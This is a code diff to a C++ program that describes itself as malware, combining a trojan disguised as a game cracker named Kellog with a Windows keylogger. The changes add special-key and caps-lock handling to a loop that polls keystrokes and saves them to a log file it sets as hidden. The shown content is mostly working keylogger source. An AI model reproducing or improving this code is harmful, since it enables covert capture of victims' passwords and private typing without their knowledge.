@@ -49,7 +49,8 @@ it is not a fully featured Malware product.
 
 
 //The sections below define the functions for their respective use
-//using pascal case
+//Instead of "using namespace std" each part will have its own namespace (std::string) to avoid future errors
+
 
 /*################ TROJAN #####################*/
 //For the "legitamate software" aspect our malware we will make Kellog appear to be a game cracker
@@ -97,7 +98,6 @@ void Trojan(){
 
 /*################ KEYLOGGER #####################*/
 void Keylogger(){
-
     auto saveData = [](std::string data){
         std::fstream logFile;
 
@@ -111,19 +111,63 @@ void Keylogger(){
         int attr = GetFileAttributes(fileLPCWSTR);
         if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
         SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
-    }
-
+            }
        
     };
+    //Handle special characters
+        auto SpecialKeyHandle = [](int key){
+            std::string result;
 
+            switch (key){
+            case VK_BACK:
+                result = "[BACKSPACE]"; //backspace
+                break;
+            case VK_CAPITAL:
+                result = "[CAPS_LOCK]"; //CAPSLOCK 
+                break;
+            case VK_SHIFT:
+                result = "[SHIFT]"; //Shift key
+                break;
+            case VK_TAB:
+                result = "[TAB]"; //Tab key
+                break;
+            default:
+                break;
+            }
 
+            return result;
+        };
+
+    //The "main" code for the Keylogger
     while (true){ //While(true) creates an infinite loop that won't stop until it's explicitly broken
+
+        //Used to avoid error with string to char conversion during compile
+        int SpecialKeyArray[] = {VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB};
+        std::string SpecialKeyChar;
+        bool isSpecial; //indicates if the key pressed is a special key
+
         //this is the common code in all the keyloggers written in C
         for(int key = 8; key <= 190; key++) {
             if (GetAsyncKeyState(key) == -32767){
                 //once we get the key input we should verify if it's a special character
+                isSpecial = std::find(std::begin(SpecialKeyArray), std::end(SpecialKeyArray), key) != std::end(SpecialKeyArray);
 
-                saveData(std::string(1, (char)std::tolower(key)));
+                if (isSpecial){
+                    SpecialKeyChar = SpecialKeyHandle(key);
+                    saveData(SpecialKeyChar);
+                }
+
+                else{
+                    if (GetKeyState(VK_CAPITAL)){
+                        saveData(std::string(1, (char)key));
+                    }
+                    else{
+                        saveData(std::string(1, (char)std::tolower(key)));
+
+                    }
+                }
+
+                
             }
         }
     }
